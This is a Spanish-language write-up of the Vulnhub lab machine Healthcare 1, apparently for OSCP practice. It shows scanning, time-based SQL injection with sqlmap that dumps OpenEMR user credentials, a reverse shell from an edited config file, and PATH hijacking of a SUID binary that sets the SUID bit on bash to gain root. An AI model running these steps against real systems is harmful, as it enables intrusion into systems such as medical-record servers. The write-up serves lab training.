---
title: Healthcare-1 Writeup - Vulnhub
date: 2025-03-14
categories: [Writeups, Vulnhub OSCP Prep]
tags: [Linux, Vulnhub, CTF, healthcare-1, OSCP Prep, SQLinjection, Ghidra, PATH Hijacking]
image:
  path: /assets/img/commons/vulnhub/healthcare1/portada.png
---

Anterior [*OSCP Lab 22*](https://lvs3c.github.io/posts/OSCP-Photographer1/)

¡Saludos!

**`OSCP Lab 23`**

En este writeup, realizaremos la máquina [**Healthcare 1**](https://www.vulnhub.com/entry/healthcare-1,522/). 

Se trata de una máquina **Linux** en la cual veremos:
- **Enumeración de servicios**.
- **Fuzzing de directorios**.
- Vulnerabilidad **SQL injection time based** sobre panel de autenticación.
- Modificación de archivos de configuración para tener **Ejecución de comandos**.
- Y por último, **PATH Hijacking** analizando un binario logrando elevar privilegios y posteriormente listar las flags del CTF.

¡Empecemos!

## Reconocimiento activo

---

Necesitamos encontrar la ip correspondiente a la máquina, lo hacemos mediante la herramienta `arp-scan` y posteriormente el comando `ping` para verificar si la máquina objetivo está activa.

```bash
❯ sudo arp-scan -I ens37 --localnet --ignoredups
Interface: ens37, type: EN10MB, MAC: 00:0c:29:ef:5b:48, IPv4: 10.11.12.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.11.12.1      00:50:56:c0:00:01       VMware, Inc.
10.11.12.56     00:0c:29:5e:f3:5e       VMware, Inc.
10.11.12.200    00:50:56:e7:5f:a3       VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.547 seconds (100.51 hosts/sec). 3 responded
```

```bash
❯ ping -c 1 10.11.12.56
PING 10.11.12.56 (10.11.12.56) 56(84) bytes of data.
64 bytes from 10.11.12.56: icmp_seq=1 ttl=64 time=0.313 ms

--- 10.11.12.56 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.313/0.313/0.313/0.000 ms
```

## Escaneo - Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, ejecutamos un conjunto de scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ sudo nmap -p- -sCV 10.11.12.56 -oN nmap_services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-13 20:33 -03
Nmap scan report for 10.11.12.56
Host is up (0.00064s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3d
80/tcp open  http    Apache httpd 2.2.17 ((PCLinuxOS 2011/PREFORK-1pclos2011))
|_http-server-header: Apache/2.2.17 (PCLinuxOS 2011/PREFORK-1pclos2011)
| http-robots.txt: 8 disallowed entries
| /manual/ /manual-2.2/ /addon-modules/ /doc/ /images/
|_/all_our_e-mail_addresses /admin/ /
|_http-title: Coming Soon 2
MAC Address: 00:0C:29:5E:F3:5E (VMware)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.42 seconds
```

El informe de `Nmap` nos revela:
- Puerto `21` servidor `ProFTPD 1.3.3d`.
- Puerto `80` servidor `Apache httpd 2.2.17`.


### HTTP - 80

![web80](/assets/img/commons/vulnhub/healthcare1/web80.png){: .center-image }

Continuamos realizando un fuzzing de directorios rápido con el script `http-enum` de nmap.

```bash
❯ sudo nmap -p80 --script http-enum 10.11.12.56 -oN nmap_webscan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-13 20:35 -03
Nmap scan report for 10.11.12.56
Host is up (0.00023s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|_  /robots.txt: Robots file
MAC Address: 00:0C:29:5E:F3:5E (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.14 seconds
```

Lanzamoos `gobuster` para obtener más información sobre archivos o directorios.

```bash
❯ gobuster dir -u http://10.11.12.56/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -e -b 403,404 -x txt,php,sh
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.12.56/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,sh
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.11.12.56/index                (Status: 200) [Size: 5031]
http://10.11.12.56/images               (Status: 301) [Size: 338] [--> http://10.11.12.56/images/]
http://10.11.12.56/css                  (Status: 301) [Size: 335] [--> http://10.11.12.56/css/]
http://10.11.12.56/js                   (Status: 301) [Size: 334] [--> http://10.11.12.56/js/]
http://10.11.12.56/vendor               (Status: 301) [Size: 338] [--> http://10.11.12.56/vendor/]
http://10.11.12.56/favicon              (Status: 200) [Size: 1406]
http://10.11.12.56/robots.txt           (Status: 200) [Size: 620]
http://10.11.12.56/robots               (Status: 200) [Size: 620]
http://10.11.12.56/fonts                (Status: 301) [Size: 337] [--> http://10.11.12.56/fonts/]
http://10.11.12.56/gitweb               (Status: 301) [Size: 338] [--> http://10.11.12.56/gitweb/]
http://10.11.12.56/openemr              (Status: 301) [Size: 339] [--> http://10.11.12.56/openemr/]
Progress: 5095332 / 5095336 (100.00%)
===============================================================
Finished
===============================================================
```

Encontramos la plataforma `OpenEMR` en su versión 4.1.0.

![openemr](/assets/img/commons/vulnhub/healthcare1/openemr.png){: .center-image }


## Explotación

---

Buscamos por `searchsploit`. Encontramos que tiene una vulnerabilidad `sqlinjection time based`.

![searchsploit](/assets/img/commons/vulnhub/healthcare1/searchsploit.png){: .center-image }

Validamos la vulnerabilidad sobre el panel de login.

![sqltimeerror](/assets/img/commons/vulnhub/healthcare1/sqltimeerror.png){: .center-image }

Capturamos la solicitud mediante `Burp Suite` y ejecutamos `sqlmap` obteniendo resultados.

![req](/assets/img/commons/vulnhub/healthcare1/req.png){: .center-image }

```bash
❯ sqlmap -r req --batch --dbs
❯ sqlmap -r req --batch -D openemr --tables
❯ sqlmap -r req --batch -D openemr -T users --dump
```

![sqlmapusers](/assets/img/commons/vulnhub/healthcare1/sqlmapusers.png){: .center-image }

Ingresamos al panel de login correctamente.

![openemrdash](/assets/img/commons/vulnhub/healthcare1/openemrdash.png){: .center-image }


Dentro del dashboard, vamos a añadir código a un archivo de configuración para tener ejecución de comandos y poder ganar acceso al servidor mediante una reverse shell.

![rce](/assets/img/commons/vulnhub/healthcare1/rce.png){: .center-image }

Validamos y ganamos acceso al servidor.

![rs1](/assets/img/commons/vulnhub/healthcare1/rs1.png){: .center-image }

![rs2](/assets/img/commons/vulnhub/healthcare1/rs2.png){: .center-image }

```bash
❯ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.11.12.10] from (UNKNOWN) [10.11.12.56] 50467
bash: no job control in this shell
bash-4.1$ whoami
apache
```

## Escalación de privilegios

---

Listamos la user flag.

```bash
bash-4.1$ find / -type f -name user.txt 2>/dev/null
/home/almirant/user.txt
bash-4.1$ cat user.txt
d41d8cd98f00b204e9800998ecf8427e
```

Listamos los `binarios SUID`{: .filepath} para saber si podemos mediante alguno de ellos elevar nuestro privilegio.

```bash
bash-4.1$ find / -perm -4000 2>/dev/null
/usr/bin/crontab
/usr/bin/at
/usr/bin/pumount
/usr/bin/batch
/usr/bin/expiry
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/wvdial
/usr/bin/pmount
/usr/bin/sperl5.10.1
/usr/bin/gpgsm
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/su
/usr/bin/passwd
/usr/bin/gpg
/usr/bin/healthcheck
/usr/bin/Xwrapper
/usr/bin/ping6
/usr/bin/chsh
/lib/dbus-1/dbus-daemon-launch-helper
/sbin/pam_timestamp_check
/bin/ping
/bin/fusermount
/bin/su
/bin/mount
/bin/umount
```

Nos llama la atención el binario `/usr/bin/healthcheck` llamado igual que la máquina a resolver.

Nos copiamos el binario para analizar su código mediante `Ghidra`.

![path](/assets/img/commons/vulnhub/healthcare1/path.png){: .center-image }

Como podemos analizar, el binario ejecuta los comandos `ifconfig, fdisk -l, du -h`.

En este punto podemos realizar `PATH Hijacking` ya que el binario llama a los comandos de forma relativa y no absoluta.

Creamos un archivo `ifconfig`{: .filepath} en `/tmp` con nuestro código *(añadiendo el bit SUID a la bash)*, cambimos la variable de entorno `PATH` para que comience a buscar los binarios por `/tmp`{: .filepath} y ejecutamos el binario ganando privilegios sobre la bash *(bash -p)*.

Listamos la root flag.

```bash
bash-4.1$ echo "chmod u+s /bin/bash" > ifconfig
bash-4.1$ cat ifconfig
chmod u+s /bin/bash
bash-4.1$ ls -l /bin/bash
-rwxr-xr-x 1 root root 864208 Jan 17  2010 /bin/bash


bash-4.1$ echo $PATH
/sbin:/usr/sbin:/bin:/usr/bin
bash-4.1$ export PATH=/tmp:$PATH
bash-4.1$ echo $PATH
/tmp:/sbin:/usr/sbin:/bin:/usr/bin

bash3-4.1$ ls -l /bin/bash
-rwsr-xr-x 1 root root 864208 Jan 17  2010 /bin/bash
bash3-4.1$ bash -p
bash-4.1# id
uid=479(apache) gid=416(apache) euid=0(root) groups=0(root),416(apache)
bash-4.1# cd /root
bash-4.1# ls
Desktop  Documents  drakx  healthcheck  healthcheck.c  root.txt  sudo.rpm  tmp
bash-4.1# cat root.txt
██    ██  ██████  ██    ██     ████████ ██████  ██ ███████ ██████      ██   ██  █████  ██████  ██████  ███████ ██████  ██ 
 ██  ██  ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██ ██ 
  ████   ██    ██ ██    ██        ██    ██████  ██ █████   ██   ██     ███████ ███████ ██████  ██   ██ █████   ██████  ██ 
   ██    ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██    
   ██     ██████   ██████         ██    ██   ██ ██ ███████ ██████      ██   ██ ██   ██ ██   ██ ██████  ███████ ██   ██ ██ 
                                                                                                                          

Thanks for Playing!

Follow me at: http://v1n1v131r4.com


root hash: eaff25eaa9ffc8b62e3dfebf70e83a7b

bash-4.1#
```

Hope it helps!